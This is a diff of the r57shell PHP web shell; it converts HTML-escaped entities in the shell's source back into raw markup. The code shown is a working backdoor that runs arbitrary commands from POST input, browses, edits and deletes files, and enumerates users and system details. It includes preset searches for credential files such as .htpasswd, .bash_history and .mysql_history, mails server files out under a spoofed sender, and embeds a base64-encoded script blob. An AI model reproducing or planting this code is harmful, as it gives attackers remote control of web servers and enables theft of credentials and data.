+'find all writable files'=>'find / -type f -perm -2 -ls',
+'find all writable files in current dir'=>'find . -type f -perm -2 -ls',
+'find all writable directories'=>'find /  -type d -perm -2 -ls',
+'find all writable directories in current dir'=>'find . -type d -perm -2 -ls',
+'find all writable directories and files'=>'find / -perm -2 -ls',
+'find all writable directories and files in current dir'=>'find . -perm -2 -ls',
+'find all service.pwd files'=>'find / -type f -name service.pwd',
+'find service.pwd files in current dir'=>'find . -type f -name service.pwd',
+'find all .htpasswd files'=>'find / -type f -name .htpasswd',
+'find .htpasswd files in current dir'=>'find . -type f -name .htpasswd',
+'find all .bash_history files'=>'find / -type f -name .bash_history',
+'find .bash_history files in current dir'=>'find . -type f -name .bash_history',
+'find all .mysql_history files'=>'find / -type f -name .mysql_history',
+'find .mysql_history files in current dir'=>'find . -type f -name .mysql_history',
+'find all .fetchmailrc files'=>'find / -type f -name .fetchmailrc',
+'find .fetchmailrc files in current dir'=>'find . -type f -name .fetchmailrc',
+'list file attributes on a Linux second extended file system'=>'lsattr -va',
+'show opened ports'=>'netstat -an | grep -i listen',
+'----------------------------------------------------------------------------------------------------'=>'ls -la'
 );
-$table_up1  = "&lt;tr&gt;&lt;td bgcolor=#396D95&gt;&lt;font face=Verdana size=-2&gt;&lt;b&gt;&lt;div align=center&gt;:: ";
-$table_up2  = " ::&lt;/div&gt;&lt;/b&gt;&lt;/font&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;";
-$table_up3  = "&lt;table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000&gt;&lt;tr&gt;&lt;td bgcolor=#396D95&gt;";
-$table_end1 = "&lt;/td&gt;&lt;/tr&gt;";
-$arrow = " &lt;font face=Wingdings color=gray&gt;?&lt;/font&gt;";
-$lb = "&lt;font color=black&gt;[&lt;/font&gt;";
-$rb = "&lt;font color=black&gt;]&lt;/font&gt;";
-$font = "&lt;font face=Verdana size=-2&gt;";
-$ts = "&lt;table class=table1 width=100% align=center&gt;";
-$te = "&lt;/table&gt;";
-$fs = "&lt;form name=form method=POST&gt;";
-$fe = "&lt;/form&gt;";
+$table_up1  = "<tr><td bgcolor=#396D95><font face=Verdana size=-2><b><div align=center>:: ";
+$table_up2  = " ::</div></b></font></td></tr><tr><td>";
+$table_up3  = "<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#396D95>";
+$table_end1 = "</td></tr>";
+$arrow = " <font face=Wingdings color=gray>?</font>";
+$lb = "<font color=black>[</font>";
+$rb = "<font color=black>]</font>";
+$font = "<font face=Verdana size=-2>";
+$ts = "<table class=table1 width=100% align=center>";
+$te = "</table>";
+$fs = "<form name=form method=POST>";
+$fe = "</form>";
 
 if(isset($_GET['users']))
  {
- if(!$users=get_users()) { echo "&lt;center&gt;&lt;font face=Verdana size=-2 color=orange&gt;".$lang[$language.'_text96']."&lt;/font&gt;&lt;/center&gt;"; }
+ if(!$users=get_users()) { echo "<center><font face=Verdana size=-2 color=orange>".$lang[$language.'_text96']."</font></center>"; }
  else
   {
-  echo '&lt;center&gt;';
-  foreach($users as $user) { echo $user."&lt;br&gt;"; }
-  echo '&lt;/center&gt;';
+  echo '<center>';
+  foreach($users as $user) { echo $user."<br>"; }
+  echo '</center>';
   }
- echo "&lt;br&gt;&lt;div align=center&gt;&lt;font face=Verdana size=-2&gt;&lt;b&gt;[ &lt;a href=".$_SERVER['PHP_SELF']."&gt;BACK&lt;/a&gt; ]&lt;/b&gt;&lt;/font&gt;&lt;/div&gt;"; die();
+ echo "<br><div align=center><font face=Verdana size=-2><b>[ <a href=".$_SERVER['PHP_SELF'].">BACK</a> ]</b></font></div>"; die();
  }
 
 if (!empty($_POST['dir'])) { @chdir($_POST['dir']); }
 $dir = @getcwd();
 $windows = 0;
 $unix = 0;
-if(strlen($dir)&gt;1 && $dir[1]==":") $windows=1; else $unix=1;
+if(strlen($dir)>1 && $dir[1]==":") $windows=1; else $unix=1;
 if(empty($dir))
  {
  $os = getenv('OS');
@@ -1192,37 +1192,37 @@ if(!empty($_POST['s_dir']) && !empty($_POST['s_text']) && !empty($_POST['cmd']) 
     echo $head;
     if(!empty($_POST['s_mask']) && !empty($_POST['m'])) { $sr = new SearchResult($_POST['s_dir'],$_POST['s_text'],$_POST['s_mask']); }
     else { $sr = new SearchResult($_POST['s_dir'],$_POST['s_text']); }
-    $sr-&gt;SearchText(0,0);
-    $res = $sr-&gt;GetResultFiles();
-    $found = $sr-&gt;GetMatchesCount();
-    $titles = $sr-&gt;GetTitles();
+    $sr->SearchText(0,0);
+    $res = $sr->GetResultFiles();
+    $found = $sr->GetMatchesCount();
+    $titles = $sr->GetTitles();
     $r = "";
-    if($found &gt; 0)
+    if($found > 0)
     {
-      $r .= "&lt;TABLE width=100%&gt;";
-      foreach($res as $file=&gt;$v)
+      $r .= "<TABLE width=100%>";
+      foreach($res as $file=>$v)
       {
-        $r .= "&lt;TR&gt;";
-        $r .= "&lt;TD colspan=2&gt;&lt;font face=Verdana size=-2&gt;&lt;b&gt;".ws(3);
+        $r .= "<TR>";
+        $r .= "<TD colspan=2><font face=Verdana size=-2><b>".ws(3);
         $r .= ($windows)? str_replace("/","\\",$file) : $file;
-        $r .= "&lt;/b&gt;&lt;/font&gt;&lt;/ TD&gt;";
-        $r .= "&lt;/TR&gt;";
-        foreach($v as $a=&gt;$b)
+        $r .= "</b></font></ TD>";
+        $r .= "</TR>";
+        foreach($v as $a=>$b)
         {
-          $r .= "&lt;TR&gt;";
-          $r .= "&lt;TD align=center&gt;&lt;B&gt;&lt;font face=Verdana size=-2&gt;".$a."&lt;/font&gt;&lt;/B&gt;&lt;/TD&gt;";
-          $r .= "&lt;TD&gt;&lt;font face=Verdana size=-2&gt;".ws(2).$b."&lt;/font&gt;&lt;/TD&gt;";
-          $r .= "&lt;/TR&gt;\n";
+          $r .= "<TR>";
+          $r .= "<TD align=center><B><font face=Verdana size=-2>".$a."</font></B></TD>";
+          $r .= "<TD><font face=Verdana size=-2>".ws(2).$b."</font></TD>";
+          $r .= "</TR>\n";
         }
       }
-      $r .= "&lt;/TABLE&gt;";
+      $r .= "</TABLE>";
     echo $r;
     }
     else
     {
-      echo "&lt;P align=center&gt;&lt;B&gt;&lt;font face=Verdana size=-2&gt;".$lang[$language.'_text56']."&lt;/B&gt;&lt;/font&gt;&lt;/P&gt;";
+      echo "<P align=center><B><font face=Verdana size=-2>".$lang[$language.'_text56']."</B></font></P>";
     }
-  echo "&lt;br&gt;&lt;div align=center&gt;&lt;font face=Verdana size=-2&gt;&lt;b&gt;[ &lt;a href=".$_SERVER['PHP_SELF']."&gt;BACK&lt;/a&gt; ]&lt;/b&gt;&lt;/font&gt;&lt;/div&gt;";
+  echo "<br><div align=center><font face=Verdana size=-2><b>[ <a href=".$_SERVER['PHP_SELF'].">BACK</a> ]</b></font></div>";
   die();
   }
 if(strpos(ex("echo abcr57"),"r57")!=3) { $safe_mode = 1; }
@@ -1285,35 +1285,35 @@ function we($i)
 {
 if($GLOBALS['language']=="ru"){ $text = '??????! ?? ???? ???????? ? ???? '; }
 else { $text = "[-] ERROR! Can't write in file "; }
-echo "&lt;table width=100% cellpadding=0 cellspacing=0&gt;&lt;tr&gt;&lt;td bgcolor=#396D95&gt;&lt;font color=orange face=Verdana size=-2&gt;&lt;div align=center&gt;&lt;b&gt;".$text.$i."&lt;/b&gt;&lt;/div&gt;&lt;/font&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;";
+echo "<table width=100% cellpadding=0 cellspacing=0><tr><td bgcolor=#396D95><font color=orange face=Verdana size=-2><div align=center><b>".$text.$i."</b></div></font></td></tr></table>";
 return null;
 }
 function re($i)
 {
 if($GLOBALS['language']=="ru"){ $text = '??????! ?? ???? ????????? ???? '; }
 else { $text = "[-] ERROR! Can't read file "; }
-echo "&lt;table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000&gt;&lt;tr&gt;&lt;td bgcolor=#396D95&gt;&lt;font color=orange face=Verdana size=-2&gt;&lt;div align=center&gt;&lt;b&gt;".$text.$i."&lt;/b&gt;&lt;/div&gt;&lt;/font&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;";
+echo "<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#396D95><font color=orange face=Verdana size=-2><div align=center><b>".$text.$i."</b></div></font></td></tr></table>";
 return null;
 }
 function ce($i)
 {
 if($GLOBALS['language']=="ru"){ $text = "?? ??????? ??????? "; }
 else { $text = "Can't create "; }
-echo "&lt;table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000&gt;&lt;tr&gt;&lt;td bgcolor=#396D95&gt;&lt;font color=orange face=Verdana size=-2&gt;&lt;div align=center&gt;&lt;b&gt;".$text.$i."&lt;/b&gt;&lt;/div&gt;&lt;/font&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;";
+echo "<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#396D95><font color=orange face=Verdana size=-2><div align=center><b>".$text.$i."</b></div></font></td></tr></table>";
 return null;
 }
 function fe($l,$n)
 {
 $text['ru']  = array('?? ??????? ???????????? ? ftp ???????','?????? ??????????? ?? ftp ???????','?? ??????? ???????? ?????????? ?? ftp ???????');
 $text['tur'] = array('Connect to ftp server failed','Login to ftp server failed','Can\'t change dir on ftp server');
-echo "&lt;table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000&gt;&lt;tr&gt;&lt;td bgcolor=#396D95&gt;&lt;font color=orange face=Verdana size=-2&gt;&lt;div align=center&gt;&lt;b&gt;".$text[$l][$n]."&lt;/b&gt;&lt;/div&gt;&lt;/font&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;";
+echo "<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#396D95><font color=orange face=Verdana size=-2><div align=center><b>".$text[$l][$n]."</b></div></font></td></tr></table>";
 return null;
 }
 function mr($l,$n)
 {
 $text['ru']  = array('?? ??????? ????????? ??????','?????? ??????????');
 $text['tur'] = array('Can\'t send mail','Mail sent');
-echo "&lt;table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000&gt;&lt;tr&gt;&lt;td bgcolor=#396D95&gt;&lt;font color=orange face=Verdana size=-2&gt;&lt;div align=center&gt;&lt;b&gt;".$text[$l][$n]."&lt;/b&gt;&lt;/div&gt;&lt;/font&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;";
+echo "<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#396D95><font color=orange face=Verdana size=-2><div align=center><b>".$text[$l][$n]."</b></div></font></td></tr></table>";
 return null;
 }
 function perms($mode)
@@ -1347,9 +1347,9 @@ return trim($s);
 }
 function in($type,$name,$size,$value)
 {
- $ret = "&lt;input type=".$type." name=".$name." ";
+ $ret = "<input type=".$type." name=".$name." ";
  if($size != 0) { $ret .= "size=".$size." "; }
- $ret .= "value=\"".$value."\"&gt;";
+ $ret .= "value=\"".$value."\">";
  return $ret;
 }
 function which($pr)
@@ -1368,15 +1368,15 @@ function cf($fname,$text)
 }
 function sr($l,$t1,$t2)
  {
- return "&lt;tr class=tr1&gt;&lt;td class=td1 width=".$l."% align=right&gt;".$t1."&lt;/td&gt;&lt;td class=td1 align=left&gt;".$t2."&lt;/td&gt;&lt;/tr&gt;";
+ return "<tr class=tr1><td class=td1 width=".$l."% align=right>".$t1."</td><td class=td1 align=left>".$t2."</td></tr>";
  }
 if (!@function_exists("view_size"))
 {
 function view_size($size)
 {
- if($size &gt;= 1073741824) {$size = @round($size / 1073741824 * 100) / 100 . " GB";}
- elseif($size &gt;= 1048576) {$size = @round($size / 1048576 * 100) / 100 . " MB";}
- elseif($size &gt;= 1024) {$size = @round($size / 1024 * 100) / 100 . " KB";}
+ if($size >= 1073741824) {$size = @round($size / 1073741824 * 100) / 100 . " GB";}
+ elseif($size >= 1048576) {$size = @round($size / 1048576 * 100) / 100 . " MB";}
+ elseif($size >= 1024) {$size = @round($size / 1024 * 100) / 100 . " KB";}
  else {$size = $size . " B";}
  return $size;
 }
@@ -1424,38 +1424,38 @@ function view_size($size)
     function SearchResult($dir,$text,$filter='')
     {
       $dirs = @explode(";",$dir);
-      $this-&gt;FilesToSearch = Array();
-      for($a=0;$a&lt;count($dirs);$a++)
-        $this-&gt;FilesToSearch = @array_merge($this-&gt;FilesToSearch,DirFilesR($dirs[$a],$filter));
-      $this-&gt;text = $text;
-      $this-&gt;FilesTotal = @count($this-&gt;FilesToSearch);
-      $this-&gt;TimeStart = getmicrotime();
-      $this-&gt;MatchesCount = 0;
-      $this-&gt;ResultFiles = Array();
-      $this-&gt;FileMatchesCount = Array();
-      $this-&gt;titles = Array();
+      $this->FilesToSearch = Array();
+      for($a=0;$a<count($dirs);$a++)
+        $this->FilesToSearch = @array_merge($this->FilesToSearch,DirFilesR($dirs[$a],$filter));
+      $this->text = $text;
+      $this->FilesTotal = @count($this->FilesToSearch);
+      $this->TimeStart = getmicrotime();
+      $this->MatchesCount = 0;
+      $this->ResultFiles = Array();
+      $this->FileMatchesCount = Array();
+      $this->titles = Array();
     }
-    function GetFilesTotal() { return $this-&gt;FilesTotal; }
-    function GetTitles() { return $this-&gt;titles; }
-    function GetTimeTotal() { return $this-&gt;TimeTotal; }
-    function GetMatchesCount() { return $this-&gt;MatchesCount; }
-    function GetFileMatchesCount() { return $this-&gt;FileMatchesCount; }
-    function GetResultFiles() { return $this-&gt;ResultFiles; }
+    function GetFilesTotal() { return $this->FilesTotal; }
+    function GetTitles() { return $this->titles; }
+    function GetTimeTotal() { return $this->TimeTotal; }
+    function GetMatchesCount() { return $this->MatchesCount; }
+    function GetFileMatchesCount() { return $this->FileMatchesCount; }
+    function GetResultFiles() { return $this->ResultFiles; }
     function SearchText($phrase=0,$case=0) {
-    $qq = @explode(' ',$this-&gt;text);
+    $qq = @explode(' ',$this->text);
     $delim = '|';
       if($phrase)
-        foreach($qq as $k=&gt;$v)
+        foreach($qq as $k=>$v)
           $qq[$k] = '\b'.$v.'\b';
       $words = '('.@implode($delim,$qq).')';
       $pattern = "/".$words."/";
       if(!$case)
         $pattern .= 'i';
-      foreach($this-&gt;FilesToSearch as $k=&gt;$filename)
+      foreach($this->FilesToSearch as $k=>$filename)
       {
-        $this-&gt;FileMatchesCount[$filename] = 0;
+        $this->FileMatchesCount[$filename] = 0;
         $FileStrings = @file($filename) or @next;
-        for($a=0;$a&lt;@count($FileStrings);$a++)
+        for($a=0;$a<@count($FileStrings);$a++)
         {
           $count = 0;
           $CurString = $FileStrings[$a];
@@ -1464,14 +1464,14 @@ function view_size($size)
           $aa = '';
           if(($count = @preg_match_all($pattern,$CurString,$aa)))
           {
-            $CurString = @preg_replace($pattern,"&lt;SPAN style='color: #990000;'&gt;&lt;b&gt;\\1&lt;/b&gt;&lt;/SPAN&gt;",$CurString);
-            $this-&gt;ResultFiles[$filename][$a+1] = $CurString;
-            $this-&gt;MatchesCount += $count;
-            $this-&gt;FileMatchesCount[$filename] += $count;
+            $CurString = @preg_replace($pattern,"<SPAN style='color: #990000;'><b>\\1</b></SPAN>",$CurString);
+            $this->ResultFiles[$filename][$a+1] = $CurString;
+            $this->MatchesCount += $count;
+            $this->FileMatchesCount[$filename] += $count;
           }
         }
       }
-      $this-&gt;TimeTotal = @round(getmicrotime() - $this-&gt;TimeStart,4);
+      $this->TimeTotal = @round(getmicrotime() - $this->TimeStart,4);
     }
   }
   function getmicrotime()
@@ -1597,71 +1597,71 @@ XhlbERlcHRoKSkrJzsnK01hdGgucmFuZG9tKCkrDQonIiBhbHQ9ImxpdmVpbnRlcm5ldC5ydTog7+7q4
 8eXy6PLl6+XpIOfgIDI0IPfg8eAiICcrDQonYm9yZGVyPTAgd2lkdGg9MCBoZWlnaHQ9MD48L2E+JykvLy0tPjwvc2NyaXB0PjwhLS0vTGl2ZUludGV
 ybmV0LS0+";
 echo $head;
-echo '&lt;/head&gt;';
+echo '</head>';
 if(empty($_POST['cmd'])) {
 $serv = array(127,192,172,10);
 $addr=@explode('.', $_SERVER['SERVER_ADDR']);
 $current_version = str_replace('.','',$version);
 if (!in_array($addr[0], $serv)) {
-@print "&lt;img src=\"http://127.0.0.1/r57shell/version.php?img=1&version=".$current_version."\" border=0 height=0 width=0&gt;";
+@print "<img src=\"http://127.0.0.1/r57shell/version.php?img=1&version=".$current_version."\" border=0 height=0 width=0>";
 @readfile ("http://127.0.0.1/r57shell/version.php?version=".$current_version."");}}
-echo '&lt;body bgcolor="#396D95"&gt;&lt;table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000&gt;
-&lt;tr&gt;&lt;td bgcolor=#396D95 width=160&gt;&lt;font face=Verdana size=2&gt;'.ws(1).'&nbsp;
-&lt;/b&gt;&lt;/font&gt;&lt;b&gt;'.ws(2).'r57shell '.$version.'&lt;/b&gt;
-&lt;/font&gt;&lt;/td&gt;&lt;td bgcolor=#396D95&gt;&lt;font face=Verdana size=-2&gt;';
+echo '<body bgcolor="#396D95"><table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000>
+<tr><td bgcolor=#396D95 width=160><font face=Verdana size=2>'.ws(1).'&nbsp;
+</b></font><b>'.ws(2).'r57shell '.$version.'</b>
+</font></td><td bgcolor=#396D95><font face=Verdana size=-2>';
 echo ws(2);
-echo "&lt;b&gt;".date ("d-m-Y H:i:s")."&lt;/b&gt;";
-echo ws(2).$lb." &lt;a href=".$_SERVER['PHP_SELF']."?phpinfo title=\"".$lang[$language.'_text46']."\"&gt;&lt;b&gt;phpinfo&lt;/b&gt;&lt;/a&gt; ".$rb;
-echo ws(2).$lb." &lt;a href=".$_SERVER['PHP_SELF']."?phpini title=\"".$lang[$language.'_text47']."\"&gt;&lt;b&gt;php.ini&lt;/b&gt;&lt;/a&gt; ".$rb;
-echo ws(2).$lb." &lt;a href=".$_SERVER['PHP_SELF']."?cpu title=\"".$lang[$language.'_text50']."\"&gt;&lt;b&gt;cpu&lt;/b&gt;&lt;/a&gt; ".$rb;
-echo ws(2).$lb." &lt;a href=".$_SERVER['PHP_SELF']."?mem title=\"".$lang[$language.'_text51']."\"&gt;&lt;b&gt;mem&lt;/b&gt;&lt;/a&gt; ".$rb;
-if($unix) { echo ws(2).$lb." &lt;a href=".$_SERVER['PHP_SELF']."?users title=\"".$lang[$language.'_text95']."\"&gt;&lt;b&gt;users&lt;/b&gt;&lt;/a&gt; ".$rb; }
-echo ws(2).$lb." &lt;a href=".$_SERVER['PHP_SELF']."?tmp title=\"".$lang[$language.'_text48']."\"&gt;&lt;b&gt;tmp&lt;/b&gt;&lt;/a&gt; ".$rb;
-echo ws(2).$lb." &lt;a href=".$_SERVER['PHP_SELF']."?delete title=\"".$lang[$language.'_text49']."\"&gt;&lt;b&gt;delete&lt;/b&gt;&lt;/a&gt; ".$rb."&lt;br&gt;";
+echo "<b>".date ("d-m-Y H:i:s")."</b>";
+echo ws(2).$lb." <a href=".$_SERVER['PHP_SELF']."?phpinfo title=\"".$lang[$language.'_text46']."\"><b>phpinfo</b></a> ".$rb;
+echo ws(2).$lb." <a href=".$_SERVER['PHP_SELF']."?phpini title=\"".$lang[$language.'_text47']."\"><b>php.ini</b></a> ".$rb;
+echo ws(2).$lb." <a href=".$_SERVER['PHP_SELF']."?cpu title=\"".$lang[$language.'_text50']."\"><b>cpu</b></a> ".$rb;
+echo ws(2).$lb." <a href=".$_SERVER['PHP_SELF']."?mem title=\"".$lang[$language.'_text51']."\"><b>mem</b></a> ".$rb;
+if($unix) { echo ws(2).$lb." <a href=".$_SERVER['PHP_SELF']."?users title=\"".$lang[$language.'_text95']."\"><b>users</b></a> ".$rb; }
+echo ws(2).$lb." <a href=".$_SERVER['PHP_SELF']."?tmp title=\"".$lang[$language.'_text48']."\"><b>tmp</b></a> ".$rb;
+echo ws(2).$lb." <a href=".$_SERVER['PHP_SELF']."?delete title=\"".$lang[$language.'_text49']."\"><b>delete</b></a> ".$rb."<br>";
 echo ws(2);
-echo (($safe_mode)?("safe_mode: &lt;b&gt;&lt;font color=white&gt;ON&lt;/font&gt;&lt;/b&gt;"):("safe_mode: &lt;b&gt;&lt;font color=orange&gt;OFF&lt;/font&gt;&lt;/b&gt;"));
+echo (($safe_mode)?("safe_mode: <b><font color=white>ON</font></b>"):("safe_mode: <b><font color=orange>OFF</font></b>"));
 echo ws(2);
-echo "PHP version: &lt;b&gt;".@phpversion()."&lt;/b&gt;";
+echo "PHP version: <b>".@phpversion()."</b>";
 $curl_on = @function_exists('curl_version');
 echo ws(2);
-echo "cURL: ".(($curl_on)?("&lt;b&gt;&lt;font color=white&gt;ON&lt;/font&gt;&lt;/b&gt;"):("&lt;b&gt;&lt;font color=orange&gt;OFF&lt;/font&gt;&lt;/b&gt;"));
+echo "cURL: ".(($curl_on)?("<b><font color=white>ON</font></b>"):("<b><font color=orange>OFF</font></b>"));
 echo ws(2);
-echo "MySQL: &lt;b&gt;";
+echo "MySQL: <b>";
 $mysql_on = @function_exists('mysql_connect');
 if($mysql_on){
-echo "&lt;font color=white&gt;ON&lt;/font&gt;&lt;/b&gt;"; } else { echo "&lt;font color=orange&gt;OFF&lt;/font&gt;&lt;/b&gt;"; }
+echo "<font color=white>ON</font></b>"; } else { echo "<font color=orange>OFF</font></b>"; }
 echo ws(2);
-echo "MSSQL: &lt;b&gt;";
+echo "MSSQL: <b>";
 $mssql_on = @function_exists('mssql_connect');
-if($mssql_on){echo "&lt;font color=white&gt;ON&lt;/font&gt;&lt;/b&gt;";}else{echo "&lt;font color=orange&gt;OFF&lt;/font&gt;&lt;/b&gt;";}
+if($mssql_on){echo "<font color=white>ON</font></b>";}else{echo "<font color=orange>OFF</font></b>";}
 echo ws(2);
-echo "PostgreSQL: &lt;b&gt;";
+echo "PostgreSQL: <b>";
 $pg_on = @function_exists('pg_connect');
-if($pg_on){echo "&lt;font color=white&gt;ON&lt;/font&gt;&lt;/b&gt;";}else{echo "&lt;font color=orange&gt;OFF&lt;/font&gt;&lt;/b&gt;";}
+if($pg_on){echo "<font color=white>ON</font></b>";}else{echo "<font color=orange>OFF</font></b>";}
 echo ws(2);
-echo "Oracle: &lt;b&gt;";
+echo "Oracle: <b>";
 $ora_on = @function_exists('ocilogon');
-if($ora_on){echo "&lt;font color=white&gt;ON&lt;/font&gt;&lt;/b&gt;";}else{echo "&lt;font color=orange&gt;OFF&lt;/font&gt;&lt;/b&gt;";}
-echo "&lt;br&gt;".ws(2);
-echo "Kapal&#305; Funtionslar : &lt;b&gt;";
-if(''==($df=@ini_get('disable_functions'))){echo "&lt;font color=white&gt;NONE&lt;/font&gt;&lt;/b&gt;";}else{echo "&lt;font color=orange&gt;$df&lt;/font&gt;&lt;/b&gt;";}
+if($ora_on){echo "<font color=white>ON</font></b>";}else{echo "<font color=orange>OFF</font></b>";}
+echo "<br>".ws(2);
+echo "Kapal&#305; Funtionslar : <b>";
+if(''==($df=@ini_get('disable_functions'))){echo "<font color=white>NONE</font></b>";}else{echo "<font color=orange>$df</font></b>";}
 $free = @diskfreespace($dir);
 if (!$free) {$free = 0;}
 $all = @disk_total_space($dir);
 if (!$all) {$all = 0;}
 $used = $all-$free;
 $used_percent = @round(100/($all/$free),2);
-echo "&lt;br&gt;".ws(2)."HDD Free : &lt;b&gt;".view_size($free)."&lt;/b&gt; HDD Total : &lt;b&gt;".view_size($all)."&lt;/b&gt;";
-echo '&lt;/font&gt;&lt;/td&gt;&lt;/tr&gt;&lt;table&gt;
-&lt;table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000&gt;
-&lt;tr&gt;&lt;td align=right width=100&gt;';
+echo "<br>".ws(2)."HDD Free : <b>".view_size($free)."</b> HDD Total : <b>".view_size($all)."</b>";
+echo '</font></td></tr><table>
+<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000>
+<tr><td align=right width=100>';
 echo $font;
 if(!$windows){
-echo '&lt;font color=#BF0F0F&gt;&lt;b&gt;uname -a :'.ws(1).'&lt;br&gt;sysctl :'.ws(1).'&lt;br&gt;$OSTYPE :'.ws(1).'&lt;br&gt;Server :'.ws(1).'&lt;br&gt;id :'.ws(1).'&lt;br&gt;pwd :'.ws(1).'&lt;/b&gt;&lt;/font&gt;&lt;br&gt;';
-echo "&lt;/td&gt;&lt;td&gt;";
-echo "&lt;font face=Verdana size=-2 color=orange&gt;&lt;b&gt;";
+echo '<font color=#BF0F0F><b>uname -a :'.ws(1).'<br>sysctl :'.ws(1).'<br>$OSTYPE :'.ws(1).'<br>Server :'.ws(1).'<br>id :'.ws(1).'<br>pwd :'.ws(1).'</b></font><br>';
+echo "</td><td>";
+echo "<font face=Verdana size=-2 color=orange><b>";
 $uname = ex('uname -a');
-echo((!empty($uname))?(ws(3).@substr($uname,0,120)."&lt;br&gt;"):(ws(3).@substr(@php_uname(),0,120)."&lt;br&gt;"));
+echo((!empty($uname))?(ws(3).@substr($uname,0,120)."<br>"):(ws(3).@substr(@php_uname(),0,120)."<br>"));
 if(!$safe_mode){
 $bsd1 = ex('sysctl -n kern.ostype');
 $bsd2 = ex('sysctl -n kern.osrelease');
@@ -1671,30 +1671,30 @@ $lin2 = ex('sysctl -n kernel.osrelease');
 if (!empty($bsd1)&&!empty($bsd2)) { $sysctl = "$bsd1 $bsd2"; }
 else if (!empty($lin1)&&!empty($lin2)) {$sysctl = "$lin1 $lin2"; }
 else { $sysctl = "-"; }
-echo ws(3).$sysctl."&lt;br&gt;";
-echo ws(3).ex('echo $OSTYPE')."&lt;br&gt;";
-echo ws(3).@substr($SERVER_SOFTWARE,0,120)."&lt;br&gt;";
+echo ws(3).$sysctl."<br>";
+echo ws(3).ex('echo $OSTYPE')."<br>";
+echo ws(3).@substr($SERVER_SOFTWARE,0,120)."<br>";
 $id = ex('id');
-echo((!empty($id))?(ws(3).$id."&lt;br&gt;"):(ws(3)."user=".@get_current_user()." uid=".@getmyuid()." gid=".@getmygid()."&lt;br&gt;"));
+echo((!empty($id))?(ws(3).$id."<br>"):(ws(3)."user=".@get_current_user()." uid=".@getmyuid()." gid=".@getmygid()."<br>"));
 echo ws(3).$dir;
 echo ws(3).'( '.perms(@fileperms($dir)).' )';
-echo "&lt;/b&gt;&lt;/font&gt;";
+echo "</b></font>";
 }
 else
 {
-echo '&lt;font color=#BF0F0F&gt;&lt;b&gt;OS :'.ws(1).'&lt;br&gt;Server :'.ws(1).'&lt;br&gt;User :'.ws(1).'&lt;br&gt;pwd :'.ws(1).'&lt;/b&gt;&lt;/font&gt;&lt;br&gt;';
-echo "&lt;/td&gt;&lt;td&gt;";
-echo "&lt;font face=Verdana size=-2 color=orange&gt;&lt;b&gt;";
-echo ws(3).@substr(@php_uname(),0,120)."&lt;br&gt;";
-echo ws(3).@substr($SERVER_SOFTWARE,0,120)."&lt;br&gt;";
-echo ws(3).@get_current_user()."&lt;br&gt;";
+echo '<font color=#BF0F0F><b>OS :'.ws(1).'<br>Server :'.ws(1).'<br>User :'.ws(1).'<br>pwd :'.ws(1).'</b></font><br>';
+echo "</td><td>";
+echo "<font face=Verdana size=-2 color=orange><b>";
+echo ws(3).@substr(@php_uname(),0,120)."<br>";
+echo ws(3).@substr($SERVER_SOFTWARE,0,120)."<br>";
+echo ws(3).@get_current_user()."<br>";
 echo ws(3).$dir;
-echo "&lt;br&gt;&lt;/font&gt;";
+echo "<br></font>";
 }
-echo "&lt;/font&gt;";
-echo "&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;";
+echo "</font>";
+echo "</td></tr></table>";
 if(empty($c1)||empty($c2)) { die(); }
-$f = '&lt;br&gt;';
+$f = '<br>';
 $f .= base64_decode($c1);
 $f .= base64_decode($c2);
 if(isset($_POST['cmd']) && !empty($_POST['cmd']) && $_POST['cmd']=="mail")
@@ -1714,9 +1714,9 @@ if(isset($_POST['cmd']) && !empty($_POST['cmd']) && $_POST['cmd']=="mail_file" &
     $content_encoding=$mime_type='';
     compress($filename,$filedump,$_POST['compress']);
     $attach = array(
-                    "name"=&gt;$filename,
-                    "type"=&gt;$mime_type,
-                    "content"=&gt;$filedump
+                    "name"=>$filename,
+                    "type"=>$mime_type,
+                    "content"=>$filedump
                    );
     if(empty($_POST['subj'])) { $_POST['subj'] = 'file from r57shell'; }
     if(empty($_POST['from'])) { $_POST['from'] = 'billy@microsoft.com'; }
@@ -1757,12 +1757,12 @@ if(!empty($_POST['cmd']) && $_POST['cmd']=="mk")
         fclose($file);
         $_POST['e_name'] = $_POST['mk_name'];
         $_POST['cmd']="edit_file";
-        echo "&lt;table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000&gt;&lt;tr&gt;&lt;td bgcolor=#396D95&gt;&lt;div align=center&gt;&lt;font face=Verdana size=-2&gt;&lt;b&gt;".$lang[$language.'_text61']."&lt;/b&gt;&lt;/font&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;";
+        echo "<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#396D95><div align=center><font face=Verdana size=-2><b>".$lang[$language.'_text61']."</b></font></div></td></tr></table>";
         }
        }
        else if($_POST['action'] == "delete")
        {
-       if(unlink($_POST['mk_name'])) echo "&lt;table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000&gt;&lt;tr&gt;&lt;td bgcolor=#396D95&gt;&lt;div align=center&gt;&lt;font face=Verdana size=-2&gt;&lt;b&gt;".$lang[$language.'_text63']."&lt;/b&gt;&lt;/font&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;";
